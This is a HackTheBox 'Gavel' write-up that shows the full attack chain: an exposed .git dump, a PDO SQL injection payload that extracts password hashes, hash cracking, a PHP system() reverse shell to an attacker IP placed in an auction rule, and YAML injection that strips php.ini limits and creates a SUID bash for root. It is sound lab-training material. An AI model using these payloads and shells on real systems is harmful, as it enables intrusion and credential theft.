---
date: 2026-03-14T04:27:01-05:00
# description: ""
# image: "/images/HTB-Gavel/gavel.png"
lastmod: 2026-03-14
showTableOfContents: true
tags: ["Hackthebox", "SQLi", "PDO-SQLi", "YAML-injection", "git-exposed", "source-code-review"]
categories: ["Writeups"]
title: "HTB: Gavel"
type: "post"
---

* Platform: HackTheBox
* Link: [Gavel](https://app.hackthebox.com/machines/Gavel)
* Level: Medium
* OS: Linux
---

Gavel starts with the enumeration of an exposed `.git` repository, which provides access to the application source code. Further analysis uncovers a structural SQL injection in a PDO query, allowing extraction of administrator credentials. With admin access, a vulnerable dynamic rule mechanism in the admin panel is abused to achieve remote code execution and gain an initial shell. Subsequent system enumeration reveals a privileged binary tied to this functionality, which is leveraged to disable PHP security controls and escalate privileges to root by tampering with the bash binary.

# Scanning

```
nmap -sC -sV -oA nmap/Gavel {TARGET_IP}
```

**Results**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 09:50 EDT
Nmap scan report for 10.129.8.19 (10.129.8.19)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://gavel.htb/
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```

Two open ports discovered:
- 22 - SSH with `OpenSSH 8.9p1`
- 80 - http with `Apache 2.4.52` and a redirection to `gavel.htb`

```
sudo echo "{IP} gavel.htb" | sudo tee -a /etc/hosts
```

# Enumeration

At `http://gavel.htb/` we find an auction website offering virtual goods.

![Gavel website](/images/HTB-Gavel/gavel_website.png)

The website also has some authentication features. 

![Gavel sign up page](/images/HTB-Gavel/gavel_register.png)

After creating an account and logging in we have access to more features.

![Gavel account features](/images/HTB-Gavel/gavel_features.png)

The `inventory` option leads to `http://gavel.htb/inventory.php`.

![Gavel inventory](/images/HTB-Gavel/gavel_inventory.png)

The `bidding` button leads to `http://gavel.htb/bidding.php`.

![Gavel bidding](/images/HTB-Gavel/gavel_bidding.png)

We continue the enumeration with some directory brute forcing.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb
```

![Gobuster command](/images/HTB-Gavel/gavel_gobuster.png)

We find multiple interesting directories:
- `.git`
- `admin.php`

We extract the `.git` directory using [git-dumper](https://github.com/arthaud/git-dumper).

```
python3 -m venv myvenv
source myvenv/bin/activate
pip install git-dumper
```

```
git-dumper http://gavel.htb/.git/ git_gavel
```

## SQL Injection Identification

In vscode we analyze the different files and identify some vulnerable code.

![SQLi in source code](/images/HTB-Gavel/gavel_sqli_code.png)

The application uses PDO (PHP Data Objects) prepared statements. However the `sort` and `user_id` parameter are directly accepted in the URL. Without satisfactory input sanitization this can lead to an SQL injection vulnerability. [Here](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements), we learn how to exploit SQLis in PDO prepared statements.

The `bid_handler.php` logic retrieves the `rule` field from the `auctions` table and passes it directly into `runkit_function_add()` as the body of a dynamically generated `ruleCheck()` function. Since this function is executed immediately afterward, control over the `rule` field translates directly into arbitrary PHP code execution.

![bid_handler code](/images/HTB-Gavel/bid_handler.png)

As displayed below the inventory of the created account displays some content after winning an auction.

![Gavel inventory items](/images/HTB-Gavel/gavel_inventory.png)

Following the article, we test the vulnerability with the specified payloads.

```
# 1st Payload: ?#\0
# 2nd Payload: x`;#
```

```
http://gavel.htb/inventory.php?sort=%3f%23%00&user_id=x%60;%23
```

Under normal conditions the inventory displays items belonging to the created account. However when injecting the crafted payloads the application returns an empty inventory. This proves that the underlying SQL query logic has been altered.

![Gavel empty directory](/images/HTB-Gavel/inventory_empty.png)

Next we use the SQLi payload.
```
http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&
```

The payload performs different tasks:
- the `sort` parameter injects a backlash-escaped placeholder (`?`) followed by a comment sequence:
```
sort=\?;-- -
```
The sequence breaks the PDO's parsing and effectively truncates the remainder of the intended query.
- The result is the `user_id` parameter supplies a nested query:
```
x` FROM (
    SELECT group_concat(username,0x3a,password) AS `x`
    FROM users
)y;-- -
```
By closing the backtick context and injecting a derived query that aggregates `username:hash` values, the payload forces the database to return credential data as part of the inventory result set. Commenting out the remaining query ensures successful execution, confirming full SQL injection through structural manipulation of the prepared statement.


![leaked database data](/images/HTB-Gavel/gavel_pwd_hashes.png)

The password hash of the user `auctioneer` is returned.
```
auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
```

We crack it and retrieve the password `midnight1`.

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![auctioneer password](/images/HTB-Gavel/auctioner_pwd.png)

We login with the newly found credentials. We now have access to the `Admin Panel`.

![auctioneer login](/images/HTB-Gavel/auctioneer_login.png)

# Initial Foothold

In the `Admin Panel` we can add rules to the different auctions items.

![admin panel rules](/images/HTB-Gavel/admin_panel_rule.png)

As we saw earlier these rules are processed by `runkit_function_add()` leading to the execution of code on the server.

So our exploitation is in four steps:

1. Place a bid as auctioneer.

![admin panel rules](/images/HTB-Gavel/gavel_place_bid.png)


2. Get the `auction_id` parameter values.

> We know that `auction_id` is the parameter used because it is present in the page source code. It is also observable in the requests if Burp is used. 
> Since every auction is time-limited and linked to a unique `auction_id`, the exploitation steps must be carried out before the auction expires, after which the identifier is no longer valid.

```
curl -s http://gavel.htb/bidding.php -H 'Cookie: gavel_session=COOKIE_VALUE' | grep 'auction_id'
```

![Get auction IDs](/images/HTB-Gavel/auction_IDs.png)

3. Add a RCE command as a rule.

```
system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"'); return true;
```

![RCE command as rule](/images/HTB-Gavel/rule_RCE.png)


4. Trigger RCE payload

```
curl -X POST http://gavel.htb/includes/bid_handler.php \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Cookie: gavel_session=<COOKIE_VALUE>' \
  -d 'auction_id=<ID_NUMBER>&bid_amount=<VALUE>'
  ```
![RCE trigger](/images/HTB-Gavel/rule_rce_trigger.png)

On our listener we get a shell as `www-data`.

![Foothold on the Gavel machine](/images/HTB-Gavel/gavel_foothold.png)

Checking `/etc/passwd` confirms the presence of the `auctioneer` user. The password we used on the web application is valid for the user account.

![Gavel user flag](/images/HTB-Gavel/gavel_user_flag.png)

## Exploitation Explained

This exploitation process works because the bid flow executes the auction’s `rule` field as PHP code whenever a bid is submitted.

When we send a POST request to `includes/bid_handler.php`, the application:

1. loads the auction row for the supplied `auction_id`
2. reads the `rule` value from that auction
3. uses `runkit_function_add()` to turn that rule into a live PHP function
4. immediately calls that function to decide whether the bid is allowed

Going back to the vulnerable code:
```PHP
$rule = $auction['rule'];

if (function_exists('ruleCheck')) {
    runkit_function_remove('ruleCheck');
}
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

When we change the rule field to:
```
system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1"'); return true;
```

The application runs and builds:
```PHP
function ruleCheck($current_bid, $previous_bid, $bidder) {
    system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1"');
    return true;
}
```

And this is why our reverse shell command triggers when we place and win a bid as `auctioneer`.

In a nutshell the exploit succeeds because `bid_handler.php` treats the `rule` database field as PHP code. Submitting a bid causes the application to compile that field into a runtime function via `runkit_function_add()` and execute it. By storing a reverse-shell command in the rule body, the application triggers remote code execution when the bid ends.

> Our payload only works because PHP is allowed to call `system()`. 

# Privilege Escalation

In `/opt/gavel/` we find:

- `gaveld` - a binary file we cannot executes
- `.config` - the PHP config directory (`php.ini` is further in `/opt/gavel/.config/php/)`
- we cannot access the `submission` directory and `sample.yaml` displays the structure for an auction item.

![opt directory content](/images/HTB-Gavel/Gavel_opt.png)

![sample YAML file](/images/HTB-Gavel/sample_yaml.png)

In `/usr/local/bin` we find `gavel-util`, another binary file we can execute. We can supply a YAML file in order to submit new auction items.

![gavel_util file](/images/HTB-Gavel/gavel_util.png)

Running `systemctl list-units --type=service --state=running` we can see the `gaveld.service` running as root.

![gaveld service](/images/HTB-Gavel/gaveld_service.png)

Once again we abuse the `rule` field to escalate our privileges to root. In `sample.yaml` we see that the `rule` field is used. We will use a YAML injection attack but first we start by disabling a few PHP restrictions:

> The picture below is the original php.ini file.

![original php.ini file](/images/HTB-Gavel/phi_ini_OG.png)

```
echo 'name: newini' > new_ini.yaml
echo 'description: fix php ini' >> new_ini.yaml
echo 'image: "x.png"' >> new_ini.yaml
echo 'price: 1' >> new_ini.yaml
echo 'rule_msg: "newini"' >> new_ini.yaml
echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> new_ini.yaml
```

We submit the file.
```
/usr/local/bin/gavel-util submit /home/auctioneer/new_ini.yaml
```

![YAML file to disable PHP restrictions](/images/HTB-Gavel/new_ini.png)

After waiting a few seconds for the YAML file to be processed, we check `php.ini` again, it now has way less restrictions. We removed two major restrictions:
* `open_basedir=/opt/gavel` - it limits which directories PHP scripts are allowed to access.
* `disable_functions` - it blocks the execution of various dangerous PHP functions, by setting it to an empty list we basically allow all of them. 

![modified php.ini file](/images/HTB-Gavel/modified_php-ini.png)

Now we submit another YAML file to modify bash binary.

```
echo 'name: gavelroot' > gavelroot.yaml
echo 'description: make suid bash' >> gavelroot.yaml
echo 'image: "x.png"' >> gavelroot.yaml
echo 'price: 1' >> gavelroot.yaml
echo 'rule_msg: "rootshell"' >> gavelroot.yaml
echo "rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;" >> gavelroot.yaml
```

Submit the YAML file
```
/usr/local/bin/gavel-util submit /home/auctioneer/gavelroot.yaml
```

```
ls -lh /opt/gavel/
```

We now have a copy of the bash binary with the SUID bit set.

![Gavel SUID bash](/images/HTB-Gavel/gavel_SUID_bash.png)

We spawn a root shell and read the root flag.
```
/opt/gavel/rootbash -p
```

![Gavel root shell](/images/HTB-Gavel/Gavel_root.png)











